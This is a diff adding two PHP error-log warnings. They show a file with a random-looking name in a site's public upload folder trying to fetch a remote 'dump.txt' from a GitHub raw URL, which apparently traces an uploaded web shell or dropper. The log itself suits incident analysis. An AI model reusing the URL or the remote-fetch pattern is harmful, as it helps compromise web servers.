@@ -1,0 +1,2 @@
+[22-Sep-2024 22:07:16 UTC] PHP Warning:  file_get_contents(): https:// wrapper is disabled in the server configuration by allow_url_fopen=0 in /home/fortinet/public_html/public/upload/method/1727042824qEh.php on line 42
+[22-Sep-2024 22:07:16 UTC] PHP Warning:  file_get_contents(https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/dump.txt): Failed to open stream: no suitable wrapper could be found in /home/fortinet/public_html/public/upload/method/1727042824qEh.php on line 42
